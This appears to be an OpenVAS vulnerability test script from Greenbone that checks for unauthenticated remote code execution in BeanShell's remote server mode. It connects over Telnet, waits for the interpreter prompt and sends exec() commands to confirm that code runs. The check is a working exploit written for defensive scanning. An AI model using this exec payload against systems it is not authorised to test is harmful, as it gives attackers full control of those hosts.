###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_beanshell_rce_telnet.nasl 10234 2018-06-18 09:06:34Z cfischer $
#
# BeanShell Remote Server Mode RCE Vulnerability (Telnet)
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108445");
  script_version("$Revision: 10234 $");
  script_tag(name:"last_modification", value:"$Date: 2018-06-18 11:06:34 +0200 (Mon, 18 Jun 2018) $");
  script_tag(name:"creation_date", value:"2018-06-13 14:51:12 +0200 (Wed, 13 Jun 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("BeanShell Remote Server Mode RCE Vulnerability (Telnet)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Gain a shell remotely");
  script_dependencies("find_service1.nasl", "os_detection.nasl");
  script_mandatory_keys("beanshell_listener/detected"); # No default port

  script_xref(name:"URL", value:"http://www.beanshell.org/");
  script_xref(name:"URL", value:"http://www.beanshell.org/manual/remotemode.html");
  script_xref(name:"URL", value:"http://www.beanshell.org/manual/bshcommands.html#exec");

  script_tag(name:"summary", value:"The remote host is running the BeanShell Interpreter in remote server mode
  which is prone to a Remote Code Execution vulnerability.");

  script_tag(name:"vuldetect", value:"The script sends a crafted request and checks if it is possible to execute
  code on the target host.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to gain complete control
  over the target system.");

  script_tag(name:"affected", value:"BeanShell Interpreter running in remote server mode.");

  script_tag(name:"solution", value:"Restrict access to the listener or disable the remote server mode.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc"); # Used by exploit_commands();

port = get_kb_item( "Services/beanshell" );
if( ! port ) exit( 0 );
if( ! get_port_state( port ) ) exit( 0 );
if( ! soc = open_sock_tcp( port ) ) exit( 0 );

# To receive the banner and the prompt before we're sending the payload
while( TRUE ) {
  i++;
  if( i > 65535 ) {
    close( soc );
    exit( 0 );
  }
  r = recv( socket:soc, length:1 );
  if( strlen( r ) == 0 ) {
    close( soc );
    exit( 0 );
  }
  buf += r;
  if( egrep( pattern:"^bsh %", string:buf ) ) break;
}

cmds = exploit_commands();

foreach cmd( keys( cmds ) ) {

  # http://www.beanshell.org/manual/bshcommands.html#exec
  c = 'exec("' + cmds[ cmd ] + '");\n';
  send( socket:soc, data:c );
  res = recv( socket:soc, length:4096 ); # nb: Don't use recv_line which seems to return no data against windows systems

  # nb: On windows targets the res contains some mixed / broken chars and doesn't match the expected return of exploit_commands()
  if( egrep( pattern:cmd, string:res ) || egrep( pattern:"Windows IP \?\?\?\?", string:res ) ) {
    security_message( port:port, data:'It was possible to execute the command `' + cmds[ cmd ] + '` on the remote host.\n\nRequest:\n\n' + chomp( c ) + '\n\nResponse:\n\n' + chomp( res ) );
    close( soc );
    exit( 0 );
  }
}

close( soc );
exit( 99 );
